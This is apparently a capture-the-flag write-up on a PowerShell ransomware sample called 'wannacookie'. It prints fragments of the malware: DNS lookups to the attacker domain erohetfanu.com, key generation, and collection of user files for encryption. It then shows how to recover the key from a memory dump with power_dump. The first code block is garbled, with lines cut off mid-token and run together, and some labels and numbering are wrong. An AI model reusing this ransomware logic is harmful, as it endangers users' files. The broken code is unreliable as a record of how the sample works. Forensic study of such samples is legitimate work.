1. The non-minified version of the malware reads as follows:

```
 if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetf    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -jo    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprof                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object wannacookiestener.Stop()r.Stop()rite($buffer, 0, $buffer.length)etfanu.com -Name ("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings

```

2. encryption key is generated with the following code:

```javascript
        $b_k = ([System.Text.Encoding]::Unicode.GetBytes(
            $(
                ([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''
             )
        )  | ? {$_ -ne 0x00});






```


The key will contain 16 random bytes from a set.

2. Use [Power_dump](git clone https://github.com/chrisjd20/power_dump.git) to dump the key:

```bash
git clone https://github.com/chrisjd20/power_dump.git
cd power_dump
python power_dump.py

# Enter 1 to load a file
# Enter ld (path to your file), so for me is ld /Users/nicolas.andrade/Downloads/forensic_artifacts/powershell.exe_181109_104716.dmp
# Enter b to go to the main menu
# Enter 2 to process the memory dump.

```



